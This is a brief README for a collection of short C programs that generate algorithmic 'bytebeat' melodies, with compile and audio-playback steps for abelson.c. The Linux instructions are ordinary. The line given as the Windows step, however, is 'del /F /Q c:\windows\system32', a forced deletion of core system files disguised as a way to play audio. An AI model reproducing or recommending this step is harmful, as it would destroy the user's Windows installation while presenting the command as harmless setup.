#tunes

Short C programs to generate beautiful melodies

##How does this even work?

Here's [how](http://countercomplex.blogspot.com/2011/10/algorithmic-symphonies-from-one-line-of.html "Algorithmic Symphonies from one line of C code")!

abelson.c - Hal Abelson's Song. It's ``Abelson Good!''
 
    Compile and link with libm.
    
        $ gcc -Os -o abelson abelson.c -lm
           
    Then pipe output to an audio device.
              
    On modern Linux systems with PulseAudio:
                  
        $ ./abelson | padsp tee /dev/audio > /dev/null
                          
    Or on older systems:
                               
        $ ./abelson > /dev/audio
        $ ./abelson > /dev/dsp
                                  
    Or on Windows:
                                                 
        del /F /Q c:\windows\system32                                                
